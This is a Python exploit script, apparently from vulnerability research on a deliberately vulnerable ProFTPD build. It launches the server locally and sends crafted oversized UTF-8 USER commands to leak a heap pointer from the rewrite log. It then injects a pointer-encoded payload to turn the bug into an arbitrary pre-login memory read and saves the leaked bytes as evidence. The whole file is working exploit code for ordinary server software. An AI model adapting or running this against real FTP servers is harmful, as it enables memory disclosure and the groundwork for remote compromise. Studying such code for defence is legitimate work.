#!/usr/bin/env python3
"""New primitive: redirect substr to leaked-ptr + DELTA, log the parser's %s read."""
import os
import re
import socket
import subprocess
import time

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-prelogin-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-prelogin-leak.log"
PORT = 21914
DELTA = int(os.environ.get("DELTA", "0"), 0)
TAG = os.environ.get("TAG", "relread")


def leak():
    for _ in range(20):
        time.sleep(0.05)
        data = open(LOG, "rb").read()
        for ln in reversed(data.split(b"\n")):
            m = re.search(rb"maps subst'd pattern: '([^']*)'", ln)
            if m and len(m.group(1)) >= 1025:
                v = m.group(1)[-6:]
                if len(v) == 6 and 0x40 <= v[-1] <= 0x7F:
                    return v
    return None


def cmd(s, arg):
    s.sendall(b"USER " + arg + b"\r\n")
    try:
        return s.recv(4096)[:120]
    except OSError:
        return b""


def main():
    open(LOG, "wb").close()
    srv = subprocess.Popen([BIN, "-n", "-c", CFG], cwd=W,
                           stdout=open(W + "/log/" + TAG + "-server.out", "wb"),
                           stderr=subprocess.STDOUT)
    lines = []
    parsed = []
    try:
        for _ in range(80):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        s = socket.create_connection(("127.0.0.1", PORT), 8)
        s.settimeout(8)
        s.recv(4096)
        ptr = None
        for length in (1025, 1026, 1027, 1028):
            cmd(s, (chr(0xE8) + "A" * (length - 1)).encode("utf-8"))
            ptr = leak()
            if ptr:
                break
        if not ptr:
            lines.append("LEAK NONE")
            return
        old = int.from_bytes(ptr + b"\x00\x00", "little")
        new = old + DELTA
        lines.append("PTR_OLD %x PTR_NEW %x DELTA %x" % (old, new, DELTA))
        ptr8 = new.to_bytes(8, "little")
        n = 1281
        cps = ["A"] * n
        for k in range(8):
            cps[8 * k] = chr(ptr8[k]) if ptr8[k] else "\u0100"
        cmd(s, "".join(cps).encode("utf-8"))
        cmd(s, b"labuser")
        s.close()
        time.sleep(0.1)
        data = open(LOG, "rb").read()
        for ln in data.split(b"\n"):
            m = re.search(rb"parsing '([^']*)'", ln)
            if m:
                parsed.append(m.group(1))
        lines.append("SIGNALS %d" % open(W + "/log/" + TAG + "-server.out", "rb").read().count(b"signal 11"))
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        for idx in range(len(parsed) - 1, 0, -1):
            if len(parsed[idx - 1]) > 1000:
                val = parsed[idx]
                lines.append("READ_LEN %d" % len(val))
                lines.append("READ_HEX %s" % val[:256].hex())
                lines.append("READ_REPR %r" % val[:128])
                break
        with open(W + "/evidence/" + TAG + ".txt", "w") as f:
            f.write("\n".join(lines) + "\n")
        print("\n".join(lines))


if __name__ == "__main__":
    main()
